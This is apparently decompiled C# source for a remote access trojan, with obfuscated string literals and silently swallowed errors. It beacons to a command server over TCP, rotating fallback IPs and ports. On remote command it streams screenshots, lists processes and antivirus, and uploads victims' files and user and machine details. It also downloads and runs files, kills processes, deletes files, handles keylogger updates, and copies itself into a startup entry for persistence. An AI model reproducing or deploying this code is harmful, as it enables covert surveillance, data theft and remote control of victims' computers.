using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace fhlergarw;

public class fhlergarwMCDM
{
	public int port_sn = 0;

	private Dictionary<string, byte[]> fhlergarwtasks = new Dictionary<string, byte[]>();

	public DateTime fhlergarwrunTime;

	private int fhlergarwbytesRead = 0;

	public bool fhlergarwreqCnls = false;

	private int fhlergarwatmps = 0;

	public bool fhlergarwautCnls = false;

	public DateTime fhlergarwlTimeUtc;

	private fhlergarwTHRE fhlergarwStateObj = new fhlergarwTHRE();

	private fhlergarwMYINF fhlergarwUPC;

	private fhlergarwOCMD fhlergarwCMD;

	private int fhlergarwscrSize = 200;

	private ThreadStart fhlergarwfunStarter;

	public TcpClient fhlergarwtcpsck;

	public NetworkStream fhlergarwnetStream;

	private int fhlergarwbuffSize = 1024;

	private fhlergarwDRIVF fhlergarwHD = new fhlergarwDRIVF();

	public bool fhlergarwis_working = false;

	private bool fhlergarwiswitch = false;

	private bool fhlergarwthrRuning = false;

	private int fhlergarwthreadCnts = 0;

	private bool fhlergarwstr_writer = false;

	private bool fhlergarwcapScreen = false;

	private Thread fhlergarwfunThread;

	public void fhlergarwdo_start()
	{
		fhlergarwCONF.fhlergarwport = fhlergarwCONF.ports[0];
		fhlergarwrunTime = DateTime.Now;
		fhlergarwUPC = new fhlergarwMYINF();
		fhlergarwCMD = new fhlergarwOCMD(this);
		fhlergarwHD.iserver = this;
		fhlergarwHD.fhlergarwmainPath = fhlergarwCONF.fhlergarwget_mpath();
		TimerCallback callback = fhlergarwlookup_connect;
		Timer fhlergarwtimer = new Timer(callback, fhlergarwStateObj, 32110, 36110);
		fhlergarwStateObj.fhlergarwtimer = fhlergarwtimer;
	}

	private void fhlergarwcheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(fhlergarwrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				fhlergarwtcpsck.Close();
				fhlergarwis_working = false;
			}
		}
		catch
		{
		}
	}

	public string fhlergarwfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|fhlergarw".Split(new char[1] { '|' })[0] : "<|fhlergarw".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|fhlergarw".Split(new char[1] { '|' })[0] : "<|fhlergarw".Split(new char[1] { '|' })[0]);
			text = text + fhlergarwget_size(fileInfo.Length) + ((!ret) ? ">|fhlergarw".Split(new char[1] { '|' })[0] : "<|fhlergarw".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				fhlergarwpush_data(null, "fhlergarw-filsz=|fhlergarw".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void fhlergarwsaveFile(string filePath, string run)
	{
		try
		{
			byte[] array = fhlergarwpull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
				if (run == "run")
				{
					fhlergarwCMD.fhlergarwdo_process(filePath, null, sendExp: true);
				}
			}
		}
		catch
		{
		}
	}

	private bool fhlergarwIPSConfig()
	{
		try
		{
			fhlergarwCONF.fhlergarwdefaultP = fhlergarwCMD.fhlergarwserverIPD()[0];
			if (fhlergarwatmps > 20)
			{
				fhlergarwCONF.fhlergarwdefaultP = fhlergarwCMD.fhlergarwserverIPD()[1];
				if (fhlergarwatmps > 34)
				{
					fhlergarwatmps = 0;
				}
			}
			fhlergarwatmps++;
			fhlergarwtcpsck = new TcpClient();
			fhlergarwtcpsck.Connect(fhlergarwCONF.fhlergarwdefaultP, fhlergarwCONF.fhlergarwport);
			return true;
		}
		catch
		{
			fhlergarwports_switch();
			return false;
		}
	}

	private void fhlergarwlookup_connect(object source)
	{
		try
		{
			if (!fhlergarwthrRuning)
			{
				fhlergarwthrRuning = true;
				fhlergarwcheckLastatime(DateTime.Now);
				if (!fhlergarwis_working || !fhlergarwtcpsck.Connected)
				{
					fhlergarwis_working = fhlergarwIPSConfig();
					if (fhlergarwis_working)
					{
						fhlergarwbuffSize = fhlergarwtcpsck.ReceiveBufferSize;
						fhlergarwsee_responce();
					}
				}
			}
			else
			{
				fhlergarwthreadCnts++;
			}
			fhlergarwthrRuning = false;
		}
		catch
		{
			fhlergarwatmps++;
			fhlergarwthrRuning = false;
			fhlergarwthreadCnts = 0;
			fhlergarwstr_writer = false;
			fhlergarwis_working = false;
			fhlergarwiswitch = false;
		}
	}

	public void fhlergarwports_switch()
	{
		try
		{
			port_sn++;
			fhlergarwCONF.fhlergarwport = fhlergarwCONF.ports[port_sn];
			if (port_sn >= fhlergarwCONF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool fhlergarwsend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				fhlergarwpush_data(data, "fhlergarw-afile=" + fileinfo);
				return false;
			}
			fhlergarwpush_data(null, "fhlergarw-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void fhlergarwlist_processes(string cmd)
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				long num = 0L;
				string text2 = "";
				try
				{
					PerformanceCounter val = new PerformanceCounter("Process|fhlergarw".Split(new char[1] { '|' })[0], "Working Set - Private|fhlergarw".Split(new char[1] { '|' })[0], processes[i].ProcessName);
					num = val.get_RawValue() / 1024L;
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName);
					text2 = versionInfo.FileDescription;
				}
				catch
				{
				}
				text = text + processes[i].Id + ">|fhlergarw".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|fhlergarw".Split(new char[1] { '|' })[0];
				text = text + num + ">|fhlergarw".Split(new char[1] { '|' })[0];
				text = text + text2 + "<";
			}
			if (text == "")
			{
				text = "No-Access!> > > <|fhlergarw".Split(new char[1] { '|' })[0];
			}
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			fhlergarwpush_data(bytes, "fhlergarw-" + cmd + "=process|fhlergarw".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void fhlergarwload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = fhlergarwCONF.fhlergarwget_mpath() + fhlergarwCONF.fhlergarwmainApp + ".exe|fhlergarw".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			fhlergarwCONF.fhlergarwset_run("mgvs|fhlergarw".Split(new char[1] { '|' })[0], fhlergarwCONF.fhlergarwget_mpath() + fhlergarwCONF.fhlergarwmainApp + ".exe|fhlergarw".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void fhlergarwimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|fhlergarw".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|fhlergarw".Split(new char[1] { '|' })[0];
				text = text + fhlergarwget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				fhlergarwpush_data(memoryStream.ToArray(), "fhlergarw-thumb=|fhlergarw".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void fhlergarwsee_scren(string screenSize)
	{
		try
		{
			fhlergarwSCRNS fhlergarwSCRNS2 = new fhlergarwSCRNS();
			fhlergarwscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = fhlergarwSCRNS2.fhlergarwscreen(fhlergarwscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				fhlergarwpush_data(memoryStream.ToArray(), "fhlergarw-sascr=capScreen|fhlergarw".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void fhlergarwis_screen(string screenSize)
	{
		try
		{
			fhlergarwSCRNS fhlergarwSCRNS2 = new fhlergarwSCRNS();
			fhlergarwscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (fhlergarwcapScreen && fhlergarwis_working)
			{
				Bitmap val = fhlergarwSCRNS2.fhlergarwscreen(fhlergarwscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					fhlergarwpush_data(memoryStream.ToArray(), "fhlergarw-scren=capScreen|fhlergarw".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void fhlergarwuser_info()
	{
		string text = fhlergarwUPC.fhlergarwlancard + "|" + fhlergarwUPC.fhlergarwcname + "|" + fhlergarwUPC.fhlergarwuname + "|" + fhlergarwUPC.fhlergarwuip + "|" + fhlergarwCONF.fhlergarwOsname() + "|" + fhlergarwUPC.fhlergarwapver + "|";
		text += "| !fhlergarw".Split(new char[1] { '!' })[0];
		text = text + "|" + fhlergarwUPC.fhlergarwclientNum;
		text = text + "|" + fhlergarwCONF.fhlergarwget_mpath();
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		fhlergarwpush_data(bytes, "fhlergarw-info=user|fhlergarw".Split(new char[1] { '|' })[0]);
	}

	private void fhlergarwscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			fhlergarwscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void fhlergarwpush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				if (fileName != "")
				{
					string type = "fhlergarw-file=|fhlergarw".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName;
					fhlergarwpush_data(File.ReadAllBytes(lfile), type, tmp: true);
				}
			}
		}
		catch
		{
		}
	}

	public void fhlergarwremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string fhlergarwget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|fhlergarw".Split(new char[1] { '|' })[0],
				"KB|fhlergarw".Split(new char[1] { '|' })[0],
				"MB|fhlergarw".Split(new char[1] { '|' })[0],
				"GB|fhlergarw".Split(new char[1] { '|' })[0],
				"TB|fhlergarw".Split(new char[1] { '|' })[0],
				"PB|fhlergarw".Split(new char[1] { '|' })[0],
				"EB|fhlergarw".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public string[] fhlergarwget_command()
	{
		try
		{
			byte[] array = new byte[5];
			fhlergarwbytesRead = fhlergarwnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= fhlergarwbytesRead)
			{
				int count = ((num3 > fhlergarwbuffSize) ? fhlergarwbuffSize : num3);
				fhlergarwbytesRead = fhlergarwnetStream.Read(array2, num2, count);
				num2 += fhlergarwbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			fhlergarwis_working = false;
			return null;
		}
	}

	public byte[] fhlergarwpull_data()
	{
		try
		{
			fhlergarwrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			fhlergarwbytesRead = fhlergarwnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !fhlergarwreqCnls)
			{
				int count = ((num3 > fhlergarwbuffSize) ? fhlergarwbuffSize : num3);
				fhlergarwbytesRead = fhlergarwnetStream.Read(array2, num, count);
				num += fhlergarwbytesRead;
				num3 -= fhlergarwbytesRead;
				fhlergarwrunTime = DateTime.Now;
			}
			if (fhlergarwreqCnls)
			{
				fhlergarwnetStream.Flush();
				while (fhlergarwnetStream.DataAvailable && fhlergarwnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			fhlergarwis_working = false;
			return null;
		}
	}

	private void fhlergarwlistDrives()
	{
		string text = fhlergarwHD.fhlergarwlookupDrives();
		fhlergarwpush_data(null, "fhlergarw-dirs=" + text);
	}

	private void fhlergarwsee_responce()
	{
		if (!fhlergarwiswitch)
		{
			fhlergarwiswitch = true;
			fhlergarwnetStream = fhlergarwCMD.fhlergarwNS(fhlergarwtcpsck);
			fhlergarwcapScreen = false;
			while (fhlergarwis_working)
			{
				string[] switchType = fhlergarwget_command();
				if (switchType != null)
				{
					fhlergarwreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("fhlergarw-" + text) : ("fhlergarw-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "fhlergarw-procl":
						fhlergarwfunStarter = delegate
						{
							fhlergarwlist_processes("procl");
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-getavs":
						fhlergarwfunStarter = delegate
						{
							fhlergarwlist_processes("getavs");
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-thumb":
						fhlergarwimage_info(switchType[1]);
						break;
					case "fhlergarw-clping":
						fhlergarwrunTime = DateTime.Now;
						break;
					case "fhlergarw-putsrt":
						fhlergarwload_app();
						break;
					case "fhlergarw-filsz":
						fhlergarwfunStarter = delegate
						{
							fhlergarwfile_info(switchType[1]);
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-rupth":
						fhlergarwpush_data(null, "fhlergarw-appth=|fhlergarw".Split(new char[1] { '|' })[0] + fhlergarwCONF.fhlergarwget_mpath());
						break;
					case "fhlergarw-dowf":
						fhlergarwsaveFile(switchType[1], "");
						break;
					case "fhlergarw-endpo":
						try
						{
							try
							{
								Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
							}
							catch
							{
								fhlergarwCMD.fhlergarwdieProcess(Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())));
							}
						}
						catch
						{
						}
						break;
					case "fhlergarw-scrsz":
						fhlergarwscreenSize(switchType[1]);
						break;
					case "fhlergarw-cownar":
						fhlergarwCMD.fhlergarwdo_updated(7, switchType[1]);
						break;
					case "fhlergarw-cscreen":
						fhlergarwsee_scren(switchType[1]);
						break;
					case "fhlergarw-dirs":
						fhlergarwfunThread = new Thread(fhlergarwlistDrives);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-stops":
						fhlergarwcapScreen = false;
						break;
					case "fhlergarw-scren":
						fhlergarwcapScreen = true;
						fhlergarwfunStarter = delegate
						{
							fhlergarwis_screen(switchType[1]);
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-uklog":
						fhlergarwCMD.fhlergarwdo_updated(3, switchType[1]);
						break;
					case "fhlergarw-cnls":
						fhlergarwautCnls = true;
						fhlergarwreqCnls = true;
						fhlergarwcapScreen = false;
						break;
					case "fhlergarw-udlt":
						fhlergarwCMD.fhlergarwremove_user();
						fhlergarwtcpsck.Close();
						break;
					case "fhlergarw-delt":
						fhlergarwfunStarter = delegate
						{
							fhlergarwremove_file(switchType[1]);
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-afile":
						fhlergarwfunStarter = delegate
						{
							fhlergarwsend_auto(switchType[1]);
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-listf":
						fhlergarwfunStarter = delegate
						{
							fhlergarwHD.fhlergarwlookFiles(switchType[1]);
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-file":
						fhlergarwfunStarter = delegate
						{
							fhlergarwpush_file(switchType[1]);
						};
						fhlergarwfunThread = new Thread(fhlergarwfunStarter);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-info":
						fhlergarwfunThread = new Thread(fhlergarwuser_info);
						fhlergarwfunThread.Start();
						break;
					case "fhlergarw-runf":
						fhlergarwCMD.fhlergarwdo_process(switchType[1].Split(new char[1] { '>' })[0], switchType[1].Split(new char[1] { '>' })[1], sendExp: true);
						break;
					case "fhlergarw-fles":
					{
						string files = fhlergarwHD.fhlergarwlookupFiles(switchType[1]);
						if (files != null)
						{
							fhlergarwfunStarter = delegate
							{
								fhlergarwpush_data(null, "fhlergarw-fles=|fhlergarw".Split(new char[1] { '|' })[0] + files);
							};
							fhlergarwfunThread = new Thread(fhlergarwfunStarter);
							fhlergarwfunThread.Start();
						}
						break;
					}
					case "fhlergarw-dowr":
						fhlergarwsaveFile(switchType[1], "run|fhlergarw".Split(new char[1] { '|' })[0]);
						break;
					case "fhlergarw-fldr":
					{
						string Folders = fhlergarwHD.fhlergarwcheckFolders(switchType[1]);
						if (Folders != null)
						{
							fhlergarwfunStarter = delegate
							{
								fhlergarwpush_data(null, "fhlergarw-fldr=|fhlergarw".Split(new char[1] { '|' })[0] + Folders);
							};
							fhlergarwfunThread = new Thread(fhlergarwfunStarter);
							fhlergarwfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				fhlergarwis_working = false;
				break;
			}
			fhlergarwis_working = false;
			fhlergarwcapScreen = false;
		}
		fhlergarwiswitch = false;
	}

	public bool fhlergarwpush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			fhlergarwrunTime = DateTime.Now;
			if (fhlergarwstr_writer)
			{
				return false;
			}
			fhlergarwstr_writer = true;
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + num];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !fhlergarwreqCnls)
			{
				int num5 = ((num4 > fhlergarwbuffSize) ? fhlergarwbuffSize : num4);
				fhlergarwnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				fhlergarwrunTime = DateTime.Now;
			}
			fhlergarwstr_writer = false;
			if (fhlergarwreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			fhlergarwstr_writer = false;
			fhlergarwis_working = false;
			return false;
		}
	}
}
